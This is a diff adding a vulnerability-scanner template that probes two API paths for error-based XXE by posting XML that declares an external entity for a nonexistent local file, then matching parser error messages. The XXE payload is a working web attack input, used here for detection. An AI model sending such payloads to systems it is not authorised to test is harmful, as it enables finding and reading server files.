@@ -1,0 +1,32 @@
+id: xxe-error-based
+info:
+  name: XXE Error-Based Information Disclosure
+  author: AniipID
+  severity: high
+  description: Detects XXE through error messages that leak file contents or server information
+  tags: xxe,error-based,xml,disclosure
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/parse"
+      - "{{BaseURL}}/xml/validate"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///nonexistent_file_xyz">
+      ]>
+      <root>&xxe;</root>
+    matchers:
+      - type: word
+        words:
+          - "FileNotFoundException"
+          - "No such file"
+          - "file not found"
+          - "IOException"
+          - "does not exist"
+          - "SAXParseException"
+        condition: or
+        part: body
